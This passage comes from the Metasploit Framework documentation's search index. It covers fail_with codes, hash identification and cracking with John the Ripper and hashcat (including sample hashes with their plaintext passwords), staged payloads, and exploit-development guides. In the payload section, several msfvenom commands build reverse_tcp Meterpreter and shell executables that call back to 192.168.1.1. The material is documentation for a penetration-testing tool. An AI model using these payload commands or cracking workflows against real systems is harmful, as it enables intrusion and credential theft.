    "content": "The following are currently used fail_with parameters and a brief description of common uses. | fail_with parameter | Reason for failure | . | Failure::BadConfig | The user-provided parameters are invalid and must be corrected. | . | Failure::Disconnected | The target closed the connection forcibly. | . | Failure::NoAccess | An attempt to authenticate failed, likely due to invalid credentials. | . | Failure::None | The outcome for the module has already been met, for example a privilege escalation is already in an elevated context) | . | Failure::NoTarget | The specified TARGET or PAYLOAD variables are misconfigured or the target environment is unsupported. | . | Failure::NotFound | A preexisting file or resource on target is missing. | . | Failure::NotVulnerable | The target returned a response indicative of being patched or otherwise mitigated. | . | Failure::PayloadFailed | A return code from payload execution indicates the payload did not execute or terminated unexpectedly. | . | Failure::TimeoutExpired | The target did not respond to the connection request in a timely manner. Check RHOSTS and RPORT, then consider increasing WFSDelay. | . | Failure::UnexpectedReply | The target responded in an entirely unexpected way, and may not be running the vulnerable service at all. | . | Failure::Unknown | An entirely unexpected exception occurred, and the target may not be running the expected services at all. | . | Failure::Unreachable | The host or service is not reachable, often indicated by a refused connection or ICMP “unreachable” message. | . ",
    "url": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html#comprehensive-list-of-fail_with-parameters",
    "relUrl": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html#comprehensive-list-of-fail_with-parameters"
  },"144": {
    "doc": "Fail_with",
    "title": "Fail_with",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html",
    "relUrl": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html"
  },"145": {
    "doc": "Hashes and Password Cracking",
    "title": "Intro",
    "content": "This article will discuss the various libraries, dependencies, and functionality built in to metasploit for dealing with password hashes, and cracking them. In general, this will not cover storing credentials in the database, which can be read about here. Metasploit currently support cracking passwords with John the Ripper and hashcat. ",
    "url": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#intro",
    "relUrl": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#intro"
  },"146": {
    "doc": "Hashes and Password Cracking",
    "title": "Hashes",
    "content": "Many modules dump hashes from various software. Anything from the OS: Windows, OSX, and Linux, to applications such as postgres, and oracle. Similar, to the hash-identifier project, Metasploit includes a library to identify the type of a hash in a standard way. identify.rb can be given a hash, and will return the jtr type. Metasploit standardizes to John the Ripper’s types. While you may know the hash type being dumped already, using this library will help standardize future changes. ",
    "url": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#hashes",
    "relUrl": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#hashes"
  },"147": {
    "doc": "Hashes and Password Cracking",
    "title": "Hash Identify Example",
    "content": "In this first, simple, example we will simply show loading the library and calling its function. require 'metasploit/framework/hashes/identify' puts identify_hash \"$1$28772684$iEwNOgGugqO9.bIz5sk8k/\" # note, bad hashes return an empty string since nil is not accepted when creating credentials in msf. puts identify_hash \"This_is a Fake Hash\" puts identify_hash \"_9G..8147mpcfKT8g0U.\" . In practice, we receive the following output from this: . msf5 &gt; irb [*] Starting IRB shell... [*] You are in the \"framework\" object irb: warn: can't alias jobs from irb_jobs. &gt;&gt; require 'metasploit/framework/hashes/identify' =&gt; false &gt;&gt; puts identify_hash \"$1$28772684$iEwNOgGugqO9.bIz5sk8k/\" md5 =&gt; nil &gt;&gt; puts identify_hash \"This_is a Fake Hash\" =&gt; nil &gt;&gt; puts identify_hash \"_9G..8147mpcfKT8g0U.\" des,bsdi,crypt . ",
    "url": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#hash-identify-example",
    "relUrl": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#hash-identify-example"
  },"148": {
    "doc": "Hashes and Password Cracking",
    "title": "Crackers",
    "content": "Differences Between Hashcat vs JtR . This section will cover the differences between the two crackers. This is not a comparison of speed, or why one may work better in a specific case than another. General Settings . | Description | JtR | hashcat | . | session | --session | --session | . | no logging | --no-log | --logfile-disable | . | config file | --config | (n/a) | . | previous cracks | --pot | --potfile-path | . | type of hashes | --format | --hash-type | . | wordlist | --wordlist | (last parameter) | . | incremental | --incremental | --increment | . | rules | --rules | --rules-file | . | max run time | --max-run-time | --runtime | . | show results | --show | --show | . Hash Setting . | Hash | JtR | hashcat | . | List formats | john --list=formats john --list=format-all-details | hashcat -h | . |   |   |   | . | cram-md5 | hmac-md5 | 10200 | . | des | descrypt | 1500 | . | md5 (crypt is $1$) | md5crypt | 500 | . | sha1 |   | 100 | . | bsdi | bsdicrypt | 12400 | . | sha256 | sha256crypt | 7400 | . | sha512 | sha512crypt | 1800 | . | blowfish | bcrypt | 3200 | . | lanman | lm | 3000 | . | NTLM | nt | 1000 | . | mssql (05) | mssql | 131 | . | mssql12 | mssql12 | 1731 | . | mssql (2012/2014) | mssql05 | 132 | . | oracle (10) | oracle | 3100 | . | oracle 11 | oracle11 | 112 | . | oracle 12 | oracle12c | 12300 | . | postgres | dynamic_1034 | 12 | . | mysql | mysql | 200 | . | mysql-sha1 | mysql-sha1 | 300 | . | sha512($p.$s) - vmware ldap | dynamic_82 | 1710 | . | md5 (raw, unicode) | Raw-MD5u | 30 (with an empty salt) | . | NetNTLMv1 | netntlm | 5500 | . | NetNTLMv2 | netntlmv2 | 5600 | . While Metasploit standardizes with the JtR format, the hashcat library includes the jtr_format_to_hashcat_format function to translate from jtr to hashcat. Cracker Modes . Each crack mode is a set of rules which apply to that specific mode. The idea being any optimizations can be applied to that mode, and reset on other modes. These modes include: . | Incremental | Wordlist | Pin (mobile devices - hashcat specific) | Normal (jtr specific) | Single (jtr specific) | . Hashcat Optimized Kernel . Hashcat contains a -O flag which uses an optimized kernel. From internal testing it looks to be &gt;200% faster, with a password length tradeoff. For more information see https://github.com/rapid7/metasploit-framework/pull/12790 . Exporting Passwords and Hashes . Hashes can be exported to three different file formats by using the creds command and specifying an output file with the -o option. When the file ends in .jtr or .hcat the John the Ripper or Hashcat formats will be used respectively. Any other file suffix will result in the data being exported in a CSV format. Warning: When exporting in either the John the Ripper or Hashcat formats, any hashes that can not be handled by the formatter will be omitted. See the Adding a New Hash section for details on updating the formatters. Exported hashes can be filtered by a few fields like the username, and realm. One additional useful field is the hash type which can be specified with the -t/--type option. The type can be password, ntlm, hash or any of the John the Ripper format names such as netntlmv2. Example to export all NetNTLMv2 secrets for the WORKGROUP realm for use with John the Ripper: creds --realm WORKGROUP --type netntlmv2 -o /path/to/netntlmv2_hashes.jtr . ",
    "url": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#crackers",
    "relUrl": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#crackers"
  },"149": {
    "doc": "Hashes and Password Cracking",
    "title": "Example Hashes",
    "content": "Hashcat . | hashcat.net | . JtR . | pentestmonkey.net | openwall.info | . For testing Hashcat/JtR integration, this is a common list of commands to import example hashes of many different types. When possible the username is separated by an underscore, and anything after it is the password. For example des_password, the password for the hash is password: . creds add user:des_password hash:rEK1ecacw.7.c jtr:des creds add user:md5_password hash:$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/ jtr:md5 creds add user:bsdi_password hash:_J9..K0AyUubDrfOgO4s jtr:bsdi creds add user:sha256_password hash:$5$MnfsQ4iN$ZMTppKN16y/tIsUYs/obHlhdP.Os80yXhTurpBMUbA5 jtr:sha256,crypt creds add user:sha512_password hash:$6$zWwwXKNj$gLAOoZCjcr8p/.VgV/FkGC3NX7BsXys3KHYePfuIGMNjY83dVxugPYlxVg/evpcVEJLT/rSwZcDMlVVf/bhf.1 jtr:sha512,crypt creds add user:blowfish_password hash:$2a$05$bvIG6Nmid91Mu9RcmmWZfO5HJIMCT8riNW0hEp8f6/FuA2/mHZFpe jtr:bf creds add user:lm_password ntlm:E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C jtr:lm creds add user:nt_password ntlm:AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C jtr:nt creds add user:mssql05_toto hash:0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908 jtr:mssql05 creds add user:mssql_foo hash:0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254 jtr:mssql creds add user:mssql12_Password1! hash:0x0200F733058A07892C5CACE899768F89965F6BD1DED7955FE89E1C9A10E27849B0B213B5CE92CC9347ECCB34C3EFADAF2FD99BFFECD8D9150DD6AACB5D409A9D2652A4E0AF16 jtr:mssql12 creds add user:mysql_probe hash:445ff82636a7ba59 jtr:mysql creds add user:mysql-sha1_tere hash:*5AD8F88516BD021DD43F171E2C785C69F8E54ADB jtr:mysql-sha1 ## oracle (10) uses usernames in the hashing, so we can't overide that here creds add user:simon hash:4F8BC1809CB2AF77 jtr:des,oracle creds add user:SYSTEM hash:9EEDFA0AD26C6D52 jtr:des,oracle ## oracle 11/12 H value, username is used creds add user:DEMO hash:'S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C' jtr:raw-sha1,oracle ## oracle 11/12 uses a LONG format, see lib/msf/core/auxiliary/jtr.rb creds add user:oracle11_epsilon hash:'S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C' jtr:raw-sha1,oracle creds add user:oracle12c_epsilon hash:'H:DC9894A01797D91D92ECA1DA66242209;T:E3243B98974159CC24FD2C9A8B30BA62E0E83B6CA2FC7C55177C3A7F82602E3BDD17CEB9B9091CF9DAD672B8BE961A9EAC4D344BDBA878EDC5DCB5899F689EBD8DD1BE3F67BFF9813A464382381AB36B' jtr:pbkdf2,oracle12c ## postgres uses username, so we can't overide that here creds add user:example postgres:md5be86a79bf2043622d58d5453c47d4860 ## other creds add user:hmac_password hash:'&lt;3263520797@127.0.0.1&gt;#3f089332842764e71f8400ede97a84c9' jtr:hmac-md5 creds add user:vmware_ldap hash:'$dynamic_82$a702505b8a67b45065a6a7ff81ec6685f08d06568e478e1a7695484a934b19a28b94f58595d4de68b27771362bc2b52444a0ed03e980e11ad5e5ffa6daa9e7e1$HEX$171ada255464a439569352c60258e7c6' jtr:dynamic_82 . This data breaks down to the following table: . | Hash Type | Username | Hash | Password | jtr format | Modules which dump this info | Modules which crack this | . | DES | des_password | rEK1ecacw.7.c | password | des |   | auxiliary/analyze/jtr_aix auxiliary/analyze/jtr_linux | . | MD5 | md5_password | $1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/ | password | md5 |   | auxiliary/analyze/jtr_linux | . | BSDi | bsdi_password | _J9..K0AyUubDrfOgO4s | password | bsdi |   | auxiliary/analyze/jtr_linux | . | SHA256 | sha256_password | $5$MnfsQ4iN$ZMTppKN16y/tIsUYs/obHlhdP.Os80yXhTurpBMUbA5 | password | sha256,crypt |   | auxiliary/analyze/jtr_linux | . | SHA512 | sha512_password | $6$zWwwXKNj$gLAOoZCjcr8p/.VgV/FkGC3NX7BsXys3KHYePfuIGMNjY83dVxugPYlxVg/evpcVEJLT/rSwZcDMlVVf/bhf.1 | password | sha512,crypt |   | auxiliary/analyze/jtr_linux | . | Blowfish | blowfish_password | $2a$05$bvIG6Nmid91Mu9RcmmWZfO5HJIMCT8riNW0hEp8f6/FuA2/mHZFpe | password | bf |   | auxiliary/analyze/jtr_linux | . | Lanman | lm_password | E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C | password | lm |   | auxiliary/analyze/jtr_windows_fast | . | NTLM | nt_password | AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C | password | nt |   | auxiliary/analyze/jtr_windows_fast | . | MSSQL (2005) | mssql05_toto | 0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908 | toto | mssql05 | auxiliary/scanner/mssql/mssql_hashdump | auxiliary/analyze/jtr_mssql_fast | . | MSSQL | mssql_foo | 0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254 | foo | mssql | auxiliary/scanner/mssql/mssql_hashdump | auxiliary/analyze/jtr_mssql_fast | . | MSSQL (2012) | mssql12_Password1! | 0x0200F733058A07892C5CACE899768F89965F6BD1DED7955FE89E1C9A10E27849B0B213B5CE92CC9347ECCB34C3EFADAF2FD99BFFECD8D9150DD6AACB5D409A9D2652A4E0AF16 | Password! | mssql12 | auxiliary/scanner/mssql/mssql_hashdump | auxiliary/analyze/jtr_mssql_fast | . | MySQL | mysql_probe | 445ff82636a7ba59 | probe | mysql | auxiliary/scanner/mysql/mysql_hashdump | auxiliary/analyze/jtr_mysql_fast | . | MySQL SHA1 | mysql-sha1_tere | *5AD8F88516BD021DD43F171E2C785C69F8E54ADB | tere | mysql-sha1 | auxiliary/scanner/mysql/mysql_hashdump | auxiliary/analyze/jtr_mysql_fast | . | Oracle | simon | 4F8BC1809CB2AF77 | A | des,oracle | auxiliary/scanner/oracle/oracle_hashdump | auxiliary/analyze/jtr_oracle_fast | . | Oracle | SYSTEM | 9EEDFA0AD26C6D52 | THALES | des,oracle | auxiliary/scanner/oracle/oracle_hashdump | auxiliary/analyze/jtr_oracle_fast | . | Oracle 11 | DEMO | S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C | epsilon | raw-sha1,oracle | auxiliary/scanner/oracle/oracle_hashdump | auxiliary/analyze/jtr_oracle_fast | . | Oracle 11 | oracle11_epsilon | S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C | epsilon | raw-sha1,oracle | modules/auxiliary/scanner/oracle/oracle_hashdump | auxiliary/analyze/jtr_oracle_fast | . | Oracle 12 | oracle12_epsilon | H:DC9894A01797D91D92ECA1DA66242209;T:E3243B98974159CC24FD2C9A8B30BA62E0E83B6CA2FC7C55177C3A7F82602E3BDD17CEB9B9091CF9DAD672B8BE961A9EAC4D344BDBA878EDC5DCB5899F689EBD8DD1BE3F67BFF9813A464382381AB36B | epsilon | pbkdf2,oracle12c | auxiliary/scanner/oracle/oracle_hashdump | auxiliary/analyze/jtr_oracle_fast | . | Postgres | example | md5be86a79bf2043622d58d5453c47d4860 | password | raw-md5,postgres | auxiliary/scanner/postgres/postgres_hashdump | auxiliary/analyze/jtr_postgres_fast | . | HMAC-MD5 | hmac_password | &lt;3263520797@127.0.0.1&gt;#3f089332842764e71f8400ede97a84c9 | password | hmac-md5 | auxiliary/server/capture/smtp | None | . | SHA512($p.$s)/dynamic_82/vmware ldap | vmware_ldap | $dynamic_82$a702505b8a67b45065a6a7ff81ec6685f08d06568e478e1a7695484a934b19a28b94f58595d4de68b27771362bc2b52444a0ed03e980e11ad5e5ffa6daa9e7e1$HEX$171ada255464a439569352c60258e7c6 | TestPass123# | dynamic_82 |   | None | . ",
    "url": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#example-hashes",
    "relUrl": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#example-hashes"
  },"150": {
    "doc": "Hashes and Password Cracking",
    "title": "Adding a New Hash",
    "content": "Only hashes which were found in Metasploit were added to the hash id library, and the other functions. New hashes are developed often, and new modules which find a new type of hash will most definitely be created. So what are the steps to add a new hash type to Metasploit? . | Add a new identify algorithm to: framework/hashes/identify.rb. You may want to consult external programs such as hashid or hash-identifier for suggestions. | Add the hash to the spec to ensure it works right now, and in future updates: framework/hashes/identify_spec.rb | . | Make sure the hashes are saved in the DB in the JTR format. A good source to identify what the hashes look like is pentestmonkey. | If applicable, add it into the appropriate cracker module (or create a new one). Example for Windows related hashes. | Find the hashcat hash mode, and add a JTR name to hashcat hash mode lookup | If hashcat uses a different format for the hash string, add a JTR to hashcat hash format conversion to the formatter | Update this Wiki . | Add the JTR to hashcat conversion | Add example hash(es) | . | . ",
    "url": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#adding-a-new-hash",
    "relUrl": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html#adding-a-new-hash"
  },"151": {
    "doc": "Hashes and Password Cracking",
    "title": "Hashes and Password Cracking",
    "content": " ",
    "url": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html",
    "relUrl": "/docs/using-metasploit/intermediate/hashes-and-password-cracking.html"
  },"152": {
    "doc": "How payloads work",
    "title": "How Payloads Work",
    "content": "Payload modules are stored in modules/payloads/{singles,stages,stagers}/&lt;platform&gt;. When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism. Payloads are given reference names that indicate all the pieces, like so: . | Staged payloads: &lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt; | Single payloads: &lt;platform&gt;/[arch]/&lt;single&gt; | . This results in payloads like windows/x64/meterpreter/reverse_tcp. Breaking that down, the platform is windows, the architecture is x64, the final stage we’re delivering is meterpreter, and the stager delivering it is reverse_tcp. Note that architecture is optional because in some cases it is either unnecessary or implied. An example is php/meterpreter/reverse_tcp. Arch is unneeded for PHP payloads because we’re delivering interpreted code rather than native. Singles . Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don’t have to. An example of a scenario where you might want a single is when the target has no network access – a fileformat exploit delivered via USB key is still possible. Stagers . Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code. Stages . Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C. ",
    "url": "/docs/using-metasploit/basics/how-payloads-work.html#how-payloads-work",
    "relUrl": "/docs/using-metasploit/basics/how-payloads-work.html#how-payloads-work"
  },"153": {
    "doc": "How payloads work",
    "title": "Delivering stages",
    "content": ". | The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you’re really just creating the stager. So the following commands would create functionally identical exe files: msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp . (Note that these are functionally identical – there is a lot of randomization that goes into it so no two executables are exactly the same.) . | The Ruby side acts as a client using whichever transport mechanism was set up by the stager (e.g.: tcp, http, https). | In the case of a shell stage, Metasploit will connect the remote process’s stdio to your terminal when you interact with it. | In the case of a Meterpreter stage, Metasploit will begin speaking the Meterpreter wire protocol. | . | . ",
    "url": "/docs/using-metasploit/basics/how-payloads-work.html#delivering-stages",
    "relUrl": "/docs/using-metasploit/basics/how-payloads-work.html#delivering-stages"
  },"154": {
    "doc": "How payloads work",
    "title": "How payloads work",
    "content": " ",
    "url": "/docs/using-metasploit/basics/how-payloads-work.html",
    "relUrl": "/docs/using-metasploit/basics/how-payloads-work.html"
  },"155": {
    "doc": "Adding and Updating",
    "title": "Adding and Updating",
    "content": "Update: We have automated this process (it runs every Thursday at noon US Central Time), and 99.9% of the time you will not need to follow any of the below steps. That said, if you need to update a gem in a PR, this is still a good procedure to follow. Sometimes you might want to pull in a new Ruby library or update an existing one to get more functionality. Metasploit leverages Bundler to manage Ruby gems and make dependencies easy. This document goes over the things you need to know when updating or adding gems to Metasploit. The Gemfile . Gems that are only sometimes used (say, only in test mode, or only when running with a database) are listed in a relevant Bundler group (test or db respectively) in the root Gemfile. The metasploit-framework.gemspec file . Gems that are always needed by Metasploit are kept in the metasploit-framework.gemspec file (this file is actually pulled into the Gemfile when calculating dependencies). The Lock File . The Gemfile.lock file holds the absolute versions of the Gems we want and keeps track of all the subdependencies. You should never need to manually edit this file: bundler will do it for you when you run bundle install after adding a gem. We keep this committed in the repo to ensure that all users are always on the same gem versions. Updating or adding a gem . If the gem is needed only for a specific Bundler group (like test or db), you should update the Gemfile: . | Add the Gem you want to the correct Group, or just update the version constraint. Check Bundler’s docs for the various ways to express version constraints: . gem 'my_favorite', '~&gt; 1.0' . | Run bundle install | Commit any changes to the Gemfile.lock file | . If the gem is needed any time metasploit-framework is used, you should update the metasploit-framework.gemspec file: . | Add the gem as a runtime dependency, or just update the version constraint. Check Bundler’s docs for the various ways to express version constraints: . spec.add_runtime_dependency 'my_favorite_gem', '~&gt; 3.0.1' . | Run bundle install | Commit any changes to the Gemfile.lock file. | . Gemfile.local . A Gemfile.local file is useful for adding temporary gems to the metasploit-framework, like pry-stack-explorer or other handy debugging libs; you don’t want to commit these gems into the repo, but might need them from time to time. To use a Gemfile.local file: . | Rename the Gemfile.local.example file in the repo root to Gemfile.local | Add the temporary gems you want to this file | Run bundle install | Make sure you do not commit the Gemfile.lock: git checkout -- Gemfile.lock | . ",
    "url": "/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html",
    "relUrl": "/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html"
  },"156": {
    "doc": "How to Apply to GSoC",
    "title": "Getting started",
    "content": "Students interesting in GSoC, can start by reading Google’s official guides. https://developers.google.com/open-source/gsoc/help/student-advice . Review all of the student guide and carefully read the proposal writing section. A listed idea is a seed for GSoC students to expand on and propose how to design and implement a solution. You can start by investigating the code base and how existing users interaction with msfconsole functionality. Think through scenarios on how a user might want to interact with the proposed idea. A place to get started with contributing to Metasploit is here and expanded on here. GSoC mentors tend to look for those items that have a chance of making development and usage easier or improving the overall performance of a certain area, however by starting with understanding the most common contribution patten you can get familiar with the codebase and also the mindset of users. This will help you in creating a proposal with the end user in mind. Once you have started digging feel free ask questions that help you understand the concepts you for the idea would like to propose. Initial proposals can be sent for feedback before offical submission opens to msfdev@metasploit.com. All proposals must be officially submitted during Student Application Period thru the GSoC official site. At a bare minimum, proposals should include the following: . ",
    "url": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#getting-started",
    "relUrl": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#getting-started"
  },"157": {
    "doc": "How to Apply to GSoC",
    "title": "Title",
    "content": "A brief description of what you would like to work on. See GSoC-2022-Project-Ideas for ideas. ",
    "url": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#title",
    "relUrl": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#title"
  },"158": {
    "doc": "How to Apply to GSoC",
    "title": "Vitals",
    "content": ". | Your name | Contact info - include at least: . | an email address | github user name | Freenode nick | . | . ",
    "url": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#vitals",
    "relUrl": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#vitals"
  },"159": {
    "doc": "How to Apply to GSoC",
    "title": "Skillz",
    "content": "What programming languages are you familiar with, in order of proficiency? Most of Metasploit is written in Ruby; for any project you will most likely need at least a passing knowledge of it. If you want to work on Meterpreter or Mettle, C will be necessary as well. What other projects have you worked on before? . ",
    "url": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#skillz",
    "relUrl": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#skillz"
  },"160": {
    "doc": "How to Apply to GSoC",
    "title": "Your project",
    "content": "Fill in the details. What exactly do you want to accomplish? . ",
    "url": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#your-project",
    "relUrl": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html#your-project"
  },"161": {
    "doc": "How to Apply to GSoC",
    "title": "How to Apply to GSoC",
    "content": "Note: Final project proposals must be submitted through to Google through the GSoC Program Website, as stated in the rules. Before submitting to the GSoC website, it is also helpful to solicit proposal feedback via one of the contact methods found on https://metasploit.com/contribute. If you don’t hear back right away on a proposal, don’t give up! Contributors may be busy, or you may need to try again to get someone’s attention (but don’t spam). ",
    "url": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html",
    "relUrl": "/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html"
  },"162": {
    "doc": "How to check Microsoft patch levels for your exploit",
    "title": "How to collect Microsoft patches",
    "content": "If you’re kind of hardcore with patch diffing, you probably maintain your own database of DLLs. But this may require a lot of disk space, for most people it’s probably not worth it unless you have to look at these DLLs pretty much everyday. A more economic way is probably have a way to track all these patches, and have some sort of interface to allow quick and easy access to them. Luckily, Microsoft maintains a list of all the patches in an Excel file that you can download here: . https://www.microsoft.com/en-us/download/confirmation.aspx?id=36982 . If you prefer some sort of GUI for searching, you can use Microsoft’s Security Update Guide. You can edit this dashboard to add specific filters, such as the Windows version, Internet Explorer version, Office, etc, etc. For example, if I want to find all the Internet Explorer 10 patches for Windows 7 since its debut, I can add the following filters: . | Windows 7 | Internet Explorer | . And then I sort by date from September 2012 to 2014, I get: 22 results. But of course, this number will go up because IE 10 is still supported. There are also other desktop or command-line tools that will basically check missing patches for your Windows system, such as Windows Update Powershell Module, in some cases this may work better. ",
    "url": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html#how-to-collect-microsoft-patches",
    "relUrl": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html#how-to-collect-microsoft-patches"
  },"163": {
    "doc": "How to check Microsoft patch levels for your exploit",
    "title": "Patch extraction",
    "content": ". | Old patches used to be packaged as EXEs, and this kind can be extracted by using decompression tools such as 7zip. Internet Explorer 6 patches, for example, can be extracted this way. | Newer patches packaged as EXEs support the /X flag for extraction. For example, the following will extract the patch under the same directory. Patches such as Internet Explorer 8 (for XP) can be extracted this way. | . Windows[Something]-KB[Something]-x86-ENU.exe /X:. | Most patches nowadays are packaged as MSUs. Here’s what you have to do: | . | Put all your *.msu files under the same directory (in Windows) | Run tools/exploit/extract_msu.bat [absolute directory path to *.msu files) | extract_msu.bat should automatically extract all the *.msu files. The “extracted” sub-directory in each new folder is where you can find the updated components. | . Note: The update folders might be labeled as GDR or QRE. GDR indicates Generation Distribution Release, while QRE means Quick Fix Engineering. ",
    "url": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html#patch-extraction",
    "relUrl": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html#patch-extraction"
  },"164": {
    "doc": "How to check Microsoft patch levels for your exploit",
    "title": "Checking gadgets in patches",
    "content": "The quickest way to check gadgets across different patches is by using Metasploit’s msfpescan utility (or msfbinscan, which is smart enough to know it’s PE format). It’s really easy, all you have to do is put the DLLs in the same directory, and then do: . $ ./msfbinscan -D -a [address] -A 10 /patches/*.dll . What that does is the tool will disassemble all the DLLs under that directory, at that specific address for 10 bytes. You can probably automate a little more to quickly identify which DLLs don’t have right gadget, and if that’s the case for you, that means the gadget you’re using is unsafe. You should find another one that’s more reliable. ",
    "url": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html#checking-gadgets-in-patches",
    "relUrl": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html#checking-gadgets-in-patches"
  },"165": {
    "doc": "How to check Microsoft patch levels for your exploit",
    "title": "How to check Microsoft patch levels for your exploit",
    "content": "Checking patch levels is an important task for vulnerability research or exploit development. As a bug-hunting kind of guy, you should care about patch levels because say you have an 0day for Internet Explorer 10, you can’t always assume it affects all IE 10 builds since its debut (2012). If you realize your 0day only affects one or two builds, how much of a threat is it? Probably not as bad as you think. If you’re an exploit developer, you’re checking patches for another reason: maximum reliability. There are a lot of ways your exploit can fail, a bad gadget due to a change by a system update is easily one of them. If this update occurred at a pretty early stage, chances are your exploit will fail a lot, too. ",
    "url": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html",
    "relUrl": "/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html"
  },"166": {
    "doc": "FileDropper",
    "title": "On this page",
    "content": ". | Examples | Reference | . In some exploitation scenarios such as local privilege escalation, command execution, write privilege attacks, SQL Injections, etc, it is very likely that you have to upload one or more malicious files in order to gain control of the target machine. Well, a smart attacker shouldn’t leave anything behind, so if a module needs to drop something onto the file system, it’s important to remove it right after the purpose is served. And that is why we created the FileDropper mixin. ",
    "url": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html#on-this-page",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-clean-up-files-using-filedropper.html#on-this-page"
  },"167": {
    "doc": "FileDropper",
    "title": "Examples",
